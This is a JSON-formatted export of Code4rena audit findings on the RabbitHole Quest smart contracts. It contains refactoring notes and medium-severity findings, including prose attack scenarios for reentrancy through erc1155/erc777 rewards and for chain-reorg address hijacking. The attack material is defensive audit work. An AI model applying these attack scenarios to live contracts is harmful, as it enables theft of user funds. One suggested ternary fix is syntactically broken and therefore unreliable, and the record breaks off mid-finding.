      "content": "In the `claim` function a check is made to ensure the quest isn't paused. Considering the fact that the modifier `onlyQuestActive` is only used once and it's on this particular function. The check can be refactored in the modifier instead of applying it in the function.\n\n```solidity\ncontracts/Quest.sol\n\n96:  function claim() public virtual onlyQuestActive {\n97:        if (isPaused) revert QuestPaused();\n\n88:  modifier onlyQuestActive() {\n89:        if (!hasStarted) revert NotStarted();\n90:        if (block.timestamp < startTime) revert ClaimWindowNotStarted();\n91:        _;\n92:    }\n```\n\nRefactor the modifier `onlyQuestActive` and remove the check from the function claim:\n\n```solidity\nmodifier onlyQuestActive() {\n        if (!hasStarted) revert NotStarted();\n        if (block.timestamp < startTime) revert ClaimWindowNotStarted();\n        if (isPaused) revert QuestPaused();\n        _;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43361",
      "title": "[R-02] Unnecessary true statement is applied in the function `isClaimed`",
      "impact": "LOW",
      "content": "The function `isClaimed` checks if the given token id is claimed, for some reason there is an unnecessary true statement applied, which doesn't do anything.\n\n```solidity\ncontracts/Quest.sol\n\n135:  function isClaimed(uint256 tokenId_) public view returns (bool) {\n136:        return claimedList[tokenId_] == true;\n137:    }\n```\n\nConsider changing the above instance to:\n```solidity\n\nfunction isClaimed(uint256 tokenId_) public view returns (bool) {\n        return claimedList[tokenId_];\n   }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43360",
      "title": "[R-01] Shorthand way to write if / else statement",
      "impact": "LOW",
      "content": "The normal if / else statement can be refactored in a shorthand way to write it:\n\n1. Increases readability\n2. Shortens the overall SLOC\n\n```solidity\ncontracts/QuestFactory.sol\n\n142:  function changeCreateQuestRole(address account_, bool canCreateQuest_) public onlyOwner {\n143:        if (canCreateQuest_) {\n144:            _grantRole(CREATE_QUEST_ROLE, account_);\n145:        } else {\n146:            _revokeRole(CREATE_QUEST_ROLE, account_);\n147:        }\n148:    }\n```\n\nThe above instance can be refactored in:\n\n```solidity\nfunction changeCreateQuestRole(address account_, bool canCreateQuest_) public onlyOwner {\n        canCreateQuest_ ? _grantRole(CREATE_QUEST_ROLE, account_); : _revokeRole(CREATE_QUEST_ROLE, account_);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43359",
      "title": "[N-06] Upgradeable contract is missing a `__gap[50]` storage variable",
      "impact": "LOW",
      "content": "Reference: [Storage gaps](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)\n\n> You may notice that every contract includes a state variable named `__gap`. This is empty reserved space in storage that is put in place in Upgradeable contracts. It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments.\n\nInstances:\n\n```solidity\ncontracts/QuestFactory.sol\n\n16: contract QuestFactory is Initializable, OwnableUpgradeable, AccessControlUpgradeable, IQuestFactory {\n\ncontracts/RabbitHoleReceipt.sol\n\n15: contract RabbitHoleReceipt is\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43358",
      "title": "[N-05] Lack of address(0) checks in the constructor",
      "impact": "LOW",
      "content": "Zero-address check should be used in the constructors, to avoid the risk of setting smth as address(0) at deploying time.\n\n```solidity\ncontracts/Quest.sol\n\n26: constructor\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43357",
      "title": "[N-04] Mandatory checks for extra safety in the setters",
      "impact": "LOW",
      "content": "In the folowing functions below, there are some checks that can be made in order to achieve more safe and efficient code.\n\nAddress zero check can be added in the functions `setClaimSignerAddress`, `setRabbitHoleReceiptContract` to ensure the new addresses aren't address(0).\n\n```solidity\ncontracts/QuestFactory.sol\n\n159:  function setClaimSignerAddress(address claimSignerAddress_) public onlyOwner {\n160:        claimSignerAddress = claimSignerAddress_;\n161:    }\n\n172:  function setRabbitHoleReceiptContract(address rabbitholeReceiptContract_) public onlyOwner {\n173:        rabbitholeReceiptContract = RabbitHoleReceipt(rabbitholeReceiptContract_);\n174:    }\n```\n\nIn the function `setQuestFee` a check can be made to ensure the fee is set as non-zero.\n\n```solidity\ncontracts/QuestFactory.sol\n\n186:  function setQuestFee(uint256 questFee_) public onlyOwner {\n187:        if (questFee_ > 10_000) revert QuestFeeTooHigh();\n188:        questFee = questFee_;\n189:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43356",
      "title": "[N-03] Modifiers not applied on the functions `start` and `withdrawRemainingTokens`",
      "impact": "LOW",
      "content": "First with the function `start`, a quest should be started only by the owner, even tho the modifier is applied on the function `start` in Quest.sol. It should be added to the child contract as well.\n\n```solidity\ncontracts/Erc20Quest.sol\n\n58:  function start() public override {\n59:        if (IERC20(rewardToken).balanceOf(address(this)) < maxTotalRewards() + maxProtocolReward())\n60:            revert TotalAmountExceedsBalance();\n61:        super.start();\n62:    }\n```\n\nConsider adding the onlyOwner modifier to the function above:\n\n```solidity\nfunction start() public override onlyOwner {\n        if (IERC20(rewardToken).balanceOf(address(this)) < maxTotalRewards() + maxProtocolReward())\n            revert TotalAmountExceedsBalance();\n        super.start();\n    }\n```\n\nSame goes for the function `withdrawRemainingTokens`, an onlyOwner modifier is applied but the modifier which check if the quest ended is not. \n\n```solidity\ncontracts/Erc20Quest.sol\n\n81:  function withdrawRemainingTokens(address to_) public override onlyOwner {\n82:        super.withdrawRemainingTokens(to_);\n83:\n84:        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n85:        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n86:        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n87:    }\n```\n\nConsider adding the modifier `onlyAdminWithdrawAfterEnd` to the child contract as well:\n\n```solidity\nfunction withdrawRemainingTokens(address to_) public override onlyOwner onlyAdminWithdrawAfterEnd {\n        super.withdrawRemainingTokens(to_);\n\n        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43355",
      "title": "[N-02] Deploying a storage variable with its default value",
      "impact": "LOW",
      "content": "At a deploying time in the contract Quest, the storage variable `redeemedTokens` is set as zero, even though its default value is already zero.\n\n```solidity\ncontracts/Quest.sol\n\n26:  constructor(\n27:        address rewardTokenAddress_,\n28:        uint256 endTime_,\n29:        uint256 startTime_,\n30:        uint256 totalParticipants_,\n31:        uint256 rewardAmountInWeiOrTokenId_,\n32:        string memory questId_,\n33:        address receiptContractAddress_\n34:    ) {\n35:        if (endTime_ <= block.timestamp) revert EndTimeInPast();\n36:        if (startTime_ <= block.timestamp) revert StartTimeInPast();\n37:        if (endTime_ <= startTime_) revert EndTimeLessThanOrEqualToStartTime();\n38:        endTime = endTime_;\n39:        startTime = startTime_;\n40:        rewardToken = rewardTokenAddress_;\n41:        totalParticipants = totalParticipants_;\n42:        rewardAmountInWeiOrTokenId = rewardAmountInWeiOrTokenId_;\n43:        questId = questId_;\n44:        rabbitHoleReceiptContract = RabbitHoleReceipt(receiptContractAddress_);\n45:        redeemedTokens = 0;\n46    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43354",
      "title": "[N-01] Confusing modifier name",
      "impact": "LOW",
      "content": "A confusing name is set on the modifier `onlyAdminWithdrawAfterEnd`. By its name it says only admin withdraw after end time, but at the same time the modifier only check if `block.timestamp < endTime`.\n\n```solidity\ncontracts/Quest.sol\n\n76:  modifier onlyAdminWithdrawAfterEnd() {\n77:        if (block.timestamp < endTime) revert NoWithdrawDuringClaim();\n78:        _;\n79:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43353",
      "title": "[L-07] The function `mintReceipt` shouldn't mint receipts to users, if the quest is paused",
      "impact": "LOW",
      "content": "For now the function `mintReceipt` doesn't issue hashes before the quest has started or after the quest has ended. \n\nThis is done off-chain with the help of `claimSignerAddress`, but the off-chain side doesn't check if a quest is in paused state.\n\nSo even if a quest is in paused state duo to some sort of issue occurring, the function `mintReceipt` can still mint receipts for this particular quest.\n\n```solidity\ncontracts/QuestFactory.sol\n\n219:  function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n220:        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();\n221:        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n222:        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();\n223:        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();\n224:\n225:        quests[questId_].addressMinted[msg.sender] = true;\n226:        quests[questId_].numberMinted++;\n227:        emit ReceiptMinted(msg.sender, questId_);\n228:        rabbitholeReceiptContract.mint(msg.sender, questId_);\n229:    }\n```\n\nA recommended change l thought of:\n\n1. Create a private mapping, which will check if the quest address is paused\n\n```solidity\nmapping(string => bool) private isPaused;\n```\n\n2. Create an owner function, so the owner can change the state of the mapping. \n\n```solidity\nfunction setQuestState(string questId_, bool _paused) public onlyOwner {\n        isPaused[questId_] = _paused;\n    }\n```\n\n3. Apply the check in `mintReceipt`, so users won't be able claim receipts, when the quest is paused.\n\n```solidity\nfunction mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n+       if (isPaused[questId_] == true) revert QuestPaused();\n        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();\n        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();\n        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();\n\n        quests[questId_].addressMinted[msg.sender] = true;\n        quests[questId_].numberMinted++;\n        emit ReceiptMinted(msg.sender, questId_);\n        rabbitholeReceiptContract.mint(msg.sender, questId_);\n    }\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43352",
      "title": "[L-06] In contract Quest the function `claim` shouldn't only set the receipt as claimed, but to burn it as well. As this problem brings the risk, where users can sell already claimed receipts to other people",
      "impact": "LOW",
      "content": "The function `claim` is used by users to claim their ERC721 receipts for rewards. By using the function the receipt is set as claimed with a simple mapping id => bool, but it isn't burned. In the protocol docs it is clearly stated that users are free to sell or trade their receipts. Since the claimed receipts aren't burned, this bring the risk where already claimed receipts can be sold to other people. A burn function already exists in RabbitHoleReceipt, but isn't used.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43351",
      "title": "[L-05] The function `royaltyInfo` doesn't check if the receipt was already claimed",
      "impact": "LOW",
      "content": "The function `royaltyInfo` is used by users to check sale details regarding a particular ERC721 token.\n\nThe problem here is that the function check if the token exists, but doesn't check if the token was already claimed.\n\nConsider applying a check, which will revert if the token was already claimed.\n\n```solidity\ncontracts/RabbitHoleReceipt.sol\n\n178:  function royaltyInfo(\n179:        uint256 tokenId_,\n180:        uint256 salePrice_\n181:    ) external view override returns (address receiver, uint256 royaltyAmount) {\n182:        require(_exists(tokenId_), 'Nonexistent token');\n183:\n184:        uint256 royaltyPayment = (salePrice_ * royaltyFee) / 10_000;\n185:        return (royaltyRecipient, royaltyPayment);\n186:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43350",
      "title": "[L-04] The function `withdrawRemainingTokens` can be changed in a safer way to handle the withdraw from the owner and the protocol fee as well. This prevent risks allocated with the protocol fees.",
      "impact": "LOW",
      "content": "By the docs this function is called in two different scenarios, if a quest is full and receipt redeemers equals the max amount of total participants allowed in the quest - only withdrawFee is called. If a quest doesn't hit the max total participants, first the owner calls the function `withdrawRemainingTokens` to withdraw the remaining tokens and then the fee should be paid with the function `withdrawFee`.\n\nOverall the best solution of this problem is that the function `withdrawRemainingTokens`, both does the withdrawing part to the owner and pays the fee to the protocol as well. This is considered the safest way:\n\nFirst, if the receipt redeemers are below the totalParticipants, can withdraw the remaining tokens and pay the fee at the same time. Second, if the quest is full and receipt redemeers hits the total amount of people allowed, only the fee will be paid to the protocol and will skip the withdraw remaining rewards part.\n\n```solidity\nfunction withdrawRemainingTokens(address to_) public override onlyOwner {\n        super.withdrawRemainingTokens(to_);\n\n        if (receiptRedeemers() < totalParticipants) {\n\n        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n\n        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n\n        } else {\n\n        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n\n        }\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43349",
      "title": "[L-03] The reverting functions `_calculateRewards` and `_transferRewards` should be removed, as they are already implemented in the child contract",
      "impact": "LOW",
      "content": "There are two functions in Quest.sol, which reverts incase they are called. By the revert names, we can understand that these two functions need to be implemented in the child contracts - Erc20Quest.sol, Erc1155Quest.sol. Since this is already done and they are implemented in the child contracts, these two functions are unnecessary and should be removed.\n\n```solidity\ncontracts/Quest.sol\n\n122:  function _calculateRewards(uint256 redeemableTokenCount_) internal virtual returns (uint256) {\n123:        revert MustImplementInChild();\n124:    }\n\n129:  function _transferRewards(uint256 amount_) internal virtual {\n130:        revert MustImplementInChild();\n131:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43348",
      "title": "[L-01] `createQuest` doesn't check if the reward token address is in the allow list on ERC-1155 quest type",
      "impact": "LOW",
      "content": "The function `createQuest` is called by users with the quest role. The main purpose of the function is to create quests, which can be either erc20 or erc1155 type. When the type is erc20, a check is made to ensure the rewardTokenAddress\\_ is allowed to be used as a reward - `if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();`. The problem is that the same check isn't made when the quest is erc1155, as a result when erc1155 quest is created the function createQuest doesn't check if the rewardTokenAddress\\_ is in the allow list.\n\n```solidity\ncontracts/QuestFactory.sol\n\n61:  function createQuest(\n62:        address rewardTokenAddress_,\n63:        uint256 endTime_,\n64:        uint256 startTime_,\n65:        uint256 totalParticipants_,\n66:        uint256 rewardAmountOrTokenId_,\n67:        string memory contractType_,\n68:        string memory questId_\n69:    ) public onlyRole(CREATE_QUEST_ROLE) returns (address) {\n70:        if (quests[questId_].questAddress != address(0)) revert QuestIdUsed();\n71:\n72:        if (keccak256(abi.encodePacked(contractType_)) == keccak256(abi.encodePacked('erc20'))) {\n73:            if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();\n74:\n75:            Erc20Quest newQuest = new Erc20Quest(\n76:                rewardTokenAddress_,\n77:                endTime_,\n78:                startTime_,\n79:                totalParticipants_,\n80:                rewardAmountOrTokenId_,\n81:                questId_,\n82:                address(rabbitholeReceiptContract),\n83:                questFee,\n84:                protocolFeeRecipient\n85:            );\n86:\n87:            emit QuestCreated(\n88:                msg.sender,\n89:                address(newQuest),\n90:                questId_,\n91:                contractType_,\n92:                rewardTokenAddress_,\n93:                endTime_,\n94:                startTime_,\n95:                totalParticipants_,\n96:                rewardAmountOrTokenId_\n97:            );\n98:            quests[questId_].questAddress = address(newQuest);\n99:            quests[questId_].totalParticipants = totalParticipants_;\n100:           newQuest.transferOwnership(msg.sender);\n101:           ++questIdCount;\n102:           return address(newQuest);\n103:        }\n104:\n105:        if (keccak256(abi.encodePacked(contractType_)) == keccak256(abi.encodePacked('erc1155'))) {\n106:            if (msg.sender != owner()) revert OnlyOwnerCanCreate1155Quest();\n107:\n108:            Erc1155Quest newQuest = new Erc1155Quest(\n109:                rewardTokenAddress_,\n110:                endTime_,\n111:                startTime_,\n112:                totalParticipants_,\n113:                rewardAmountOrTokenId_,\n114:                questId_,\n115:                address(rabbitholeReceiptContract)\n116:            );\n117:\n118:            emit QuestCreated(\n119:                msg.sender,\n120:                address(newQuest),\n121:                questId_,\n122:                contractType_,\n123:                rewardTokenAddress_,\n124:                endTime_,\n125:                startTime_,\n126:                totalParticipants_,\n127:                rewardAmountOrTokenId_\n128:            );\n129:            quests[questId_].questAddress = address(newQuest);\n130:            quests[questId_].totalParticipants = totalParticipants_;\n131:            newQuest.transferOwnership(msg.sender);\n132:            ++questIdCount;\n133:            return address(newQuest);\n134:        }\n135:\n136:        revert QuestTypeInvalid();\n137:    }\n```\n\nConsider adding a check to ensure the contract address is allowed to be used as a reward on erc1155 quests as well:\n\n```solidity\n105:        if (keccak256(abi.encodePacked(contractType_)) == keccak256(abi.encodePacked('erc1155'))) {\n106:            if (msg.sender != owner()) revert OnlyOwnerCanCreate1155Quest();\n+               if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43347",
      "title": "[M-06] RabbitHoleReceipt's address might be changed therefore only manual mint will be available",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L13><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L44><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L96-L118><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L95-L104><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L215-L229>\n\nMight be impossible to claim rewards by users. And admins must distribute tokens manually and pay fee for this. On a huge amount of participants this leads to huge amount of fees.\n\n### Proof of Concept\n\nLet's consider `QuestFactory`. It has:\n\n```solidity\n    RabbitHoleReceipt public rabbitholeReceiptContract;\n```\n\nWhich responsible for mint tokens for users.\n\nThen consider `createQuest` function. Here we pass `rabbitholeReceiptContract` into `Quest`.\n\nIn `Quest` this field is immutable.\n\nNow let's consider next case:\n\n1.  We initialized whole contracts.\n2.  We created new Quest.\n3.  Next we decided to change `rabbitholeReceiptContract` in `QuestFactory` for another. To do this we call: `setRabbitHoleReceiptContract`. And successfully changing address.\n4.  Next we distribute signatures to our participants.\n5.  Users starts to mint tokens. But here is a bug `QuestFactory` storages new  address of `rabbitholeReceiptContract`, but `Quest` initialized with older one. So users successfully minted their tokens, but can't exchange them for tokens because the Quest's receipt contract know nothing about minted tokens.\n\nPossible solution here is change `minterAddress` in the original `RabbitHoleReceipt` contract and manually mint tokens by admin, but it will be too expensive and the company may lost a lot of money.\n\n### Recommended Mitigation Steps\n\nIn `QuestFactory` contract in the function `mintReceipt`  the rabbitholeReceiptContract must be fetched from the quest directly.\n\nTo `Quest` Add:\n\n```solidity\nfunction getRabbitholeReceiptContract() public view returns(RabbitHoleReceipt) {\n    return rabbitHoleReceiptContract;\n}\n```\n\nModify `mintReceipt` function in `QuestFactory` like:\n\n```solidity\nfunction mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n    ...\n    RabbitHoleReceipt rabbitholeReceiptContract = Quest(quests[questId_].questAddress).getRabbitholeReceiptContract();\n    rabbitholeReceiptContract.mint(msg.sender, questId_);\n    ...\n}\n```\n\n**[waynehoover (RabbitHole) disagreed with severity and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/425#issuecomment-1421392786):**\n > Since our contract is upgradeable, they have to trust us that we arenâ€™t going to do this during live quests. This was an emergency function, and likely wonâ€™t ever need to be used and only be accessible by only owner/us.\n\n**[kirk-baird (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/425#issuecomment-1432077395):**\n > This is a valid issue as upgrading the receipt contract will break currently open quests to prevent minting of receipts. This does not result in a loss of funds as they can be recovered by the quest creator. \n> \n> Additionally, it is only accessible by the admin and so I'm going to downgrade this to a medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue in a smart contract called Quest Protocol. The issue is related to the distribution of rewards to users participating in quests. The report suggests that it might be impossible for users to claim their rewards and that admins must manually distribute tokens and pay fees. This could result in a significant amount of fees for a large number of participants. \n\nThe report provides a proof of concept by explaining the code structure of the QuestFactory contract and how it interacts with the RabbitHoleReceipt contract responsible for minting tokens for users. It then describes a scenario where the address of the RabbitHoleReceipt contract is changed, but the Quest contract is not updated accordingly. This could lead to users being unable to exchange their tokens for rewards. \n\nThe report suggests a solution to this issue by modifying the mintReceipt function in the QuestFactory contract to fetch the RabbitHoleReceipt contract directly from the Quest contract. This would ensure that the correct contract is used for minting tokens. \n\nThere is a disagreement about the severity of this issue between the RabbitHole team and the judges. The RabbitHole team argues that since their contract is upgradeable, users must trust them not to make changes during live quests. However, the judges still consider this to be a valid issue as upgrading the receipt contract could break currently open quests. They also note that this function is only accessible by the admin and therefore downgrade the severity to medium. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/425",
      "tags": [],
      "finders": [
        "adriro",
        "libratus",
        "hansfriese",
        "glcanvas"
      ]
    },
    {
      "id": "43346",
      "title": "[M-05] When `rewardToken` is erc1155/erc777, an attacker can reenter and cause funds to be stuck in the contract forever",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/068d628f019e9469aecbf676370075c1f6c980fd/contracts/Quest.sol#L113-L116>\n\nIf the reward token is `erc1155/erc777`, an attacker can reenter and then buy/transfer another unclaimed token to the attacker address and then the var `redeemTokens` won't be equal to how many tokens were actually redeemed.\n\n### Proof of Concept\n\n**Example:**<br>\nReward token is an erc1155 that has  `_afterTokenTransfer`<br>\nAlice(attacker) has 2 receipt tokens, the first one is on a smart contract that will do the reentrancy, and the second one is on Alice's address but is approved to transfer to the smart contract(the own that holds the first receipt)\n\n1.  Alice calls the sc to `claim` rewards\n\n```solidity\n IERC1155(rewardToken).safeTransferFrom(address(this), msg.sender, rewardAmountInWeiOrTokenId, amount_, '0x00');\n```\n\n2.  `_afterTokenTransfer`  which causes the sc to call a function in its fallback function that transfers the approved token to the sc\n\n```solidity\n   try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {\n```\n\n3.  We then reenter with recipient, not yet claimed token and we claim it\n\n**Result:**<br>\nThe invariant that `redeemedTokens` = tokens that are redeemed is false because it doesn't account for the first token that we reentered.<br>\nThe issue is worse  with `erc777` tokens because of  the fact  that accounting will be in  the `withdrawRemainingTokens` function\n\n```solidity\n\n        uint256 unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n\n```\n\nafter the reentrancy<br>\nex: `redeemedTokens=9` but should be 10<br>\n`receiptRedeemers()=12`<br>\n`rewardAmountInWeiOrTokenId=1e5`<br>\n`unclaimedTokens=300000`<br>\nassuming they are some tokens left<br>\n`balance(address(this)=201000` and `protocolFee=500`<br>\n`nonClaimableTokens=201000 - 500 - 300000` it would revert ( negative numbers  with uint) and   funds would be stuck in the contract forever<br>\nThe real estimate for `nonClaimableTokens=201000-500-200000=500` and the owner can get funds out\nbut 500 wei will be lost in the contract<br>\nand  it can get worse with large amounts of quests and the attacker reentering multiple times to cause a bigger gap between the real `redeemedTokens`\n\n### Recommended Mitigation Steps\n\nAdd nonReentrancy modifier\n\n**[kirk-baird (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/523#issuecomment-1429391850)**\n\n**[waynehoover (RabbitHole) confirmed](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/523#issuecomment-1504021713)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue in the code for the Quest Protocol, where an attacker can exploit the system to receive more tokens than they are entitled to. This can happen when using a specific type of token, and the attacker can use a reentrancy attack to transfer tokens to themselves multiple times. This results in the variable for redeemed tokens not accurately reflecting the number of tokens that have been redeemed. The severity of this bug has been determined to be medium and the recommended mitigation step is to add a nonReentrancy modifier to prevent this type of attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/523",
      "tags": [],
      "finders": [
        "simon135",
        "zaskoh",
        "ForkEth",
        "0x4non",
        "ArmedGoose"
      ]
    },
    {
      "id": "43345",
      "title": "[M-01] `QuestFactory` is suspicious of the reorg attack",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L75><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L108>\n\nThe `createQuest` function deploys a quest contract using the `create`, where the address derivation depends only on the `QuestFactory` nonce.\n\nAt the same time, some of the chains (Polygon, Optimism, Arbitrum) to which the `QuestFactory` will be deployed are suspicious of the reorg attack.\n\n*   <https://polygonscan.com/blocks_forked>\n\n![](https://i.imgur.com/N8tDUVX.png)\n\nHere you may be convinced that the Polygon has in practice subject to reorgs. Even more, the reorg on the picture is 1.5 minutes long. So, it is quite enough to create the quest and transfer funds to that address, especially when someone uses a script, and not doing it by hand.\n\nOptimistic rollups (Optimism/Arbitrum) are also suspect to reorgs since if someone finds a fraud the blocks will be reverted, even though the user receives a confirmation and already created a quest.\n\n### Attack Scenario\n\nImagine that Alice deploys a quest, and then sends funds to it. Bob sees that the network block reorg happens and calls `createQuest`. Thus, it creates `quest` with an address to which Alice sends funds. Then Alices' transactions are executed and Alice transfers funds to Bob's controlled quest.\n\n### Impact\n\nIf users rely on the address derivation in advance or try to deploy the wallet with the same address on different EVM chains, any funds sent to the wallet could potentially be withdrawn by anyone else. All in all, it could lead to the theft of user funds.\n\n### Recommended Mitigation 